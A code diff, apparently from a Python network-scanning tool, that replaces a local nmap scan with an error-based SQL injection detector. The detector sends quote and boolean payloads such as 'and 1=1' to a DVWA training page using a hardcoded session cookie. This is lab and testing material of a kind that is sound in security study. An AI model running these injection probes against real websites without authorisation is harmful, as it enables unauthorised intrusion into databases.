@@ -1,9 +1,11 @@
 import ipaddress
+import random
 import re
-import json
 import socket
+import time
 
 import nmap
+import requests
 
 from PyQt5.QtCore import QSequentialAnimationGroup, QPropertyAnimation, QEasingCurve, QAbstractAnimation
 from PyQt5.QtWidgets import QWidget
@@ -138,6 +140,20 @@ class ServiceScan:
                     pass
 
 
+class CheckUrl:
+    def __init__(self, url):
+        self.url = url
+
+    def check_url(self):
+        matchObj = re.match(r"([a-zA-z]+://[^\s].*?[\/]?\?id=)[\d]+(.*)", self.url, re.M | re.I)
+        if matchObj:
+            url = matchObj.group(1)
+            remain = matchObj.group(2)
+            return {'url': url, 'remain': remain}
+        else:
+            return False
+
+
 def get_host_ip():
     """
     查询本机ip地址
@@ -152,6 +168,61 @@ def get_host_ip():
         return "没有连接网络~"
     return ip
 
+
 if __name__ == '__main__':
-    scan = ServiceScan('192.168.43.221')
-    scan.scan()
+
+    MYSQL_ERROR = "You have an error in your SQL syntax;"
+
+    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, '
+                             'like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+               'Cookie': 'security=low; PHPSESSID=7eb9edd07f56cc2ea7ca6e36d35b12b3'}
+
+    orig_url = "http://192.168.43.46/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#1"
+
+    check_url = CheckUrl(orig_url).check_url()
+    try:
+        parse_url = check_url['url']
+        remain = check_url['remain']
+
+        id_val = random.randint(1, 100)
+
+        payload_1 = {"%27": "'"}
+        payload_2 = {"+and+1%3D1": "and 1=1"}
+        payload_3 = {"+and+1%3D2": "and 1=2"}
+        payload_4 = {"%27+and+%271%27%3D%271": "' and '1'='1"}
+        payload_5 = {"%27+and+%271%27%3D%272": "' and '1'='2"}
+
+        payload_dict = {**payload_1, **payload_2, **payload_3, **payload_4, **payload_5}
+        t1 = time.time()
+        for payload in payload_dict:
+
+            url = parse_url + str(id_val) + payload + remain
+
+            if headers is not None:
+                r = requests.get(url, headers=headers, timeout=10)
+            else:
+                r = requests.get(url, timeout=10)
+
+            origin_html = r.text
+
+            if r.status_code != 200:
+                print("该网页无法正常访问")
+            else:
+                if MYSQL_ERROR not in origin_html:
+                    print("什么也没检测出来")
+                    break
+                else:
+                    print("检测到sql注入漏洞")
+                    print("原因:")
+                    print("注入===>> ", payload_dict[payload], " <<===时页面出错，产生You have an error in your SQL syntax语句")
+                    break
+
+        t2 = time.time()
+        run_time = t2 - t1
+        print('共计用时: ', round(run_time, 2))
+    except Exception as e:
+        print(e)
+        t2 = time.time()
+        run_time = t2 - t1
+        print('共计用时: ', round(run_time, 2))
+        pass
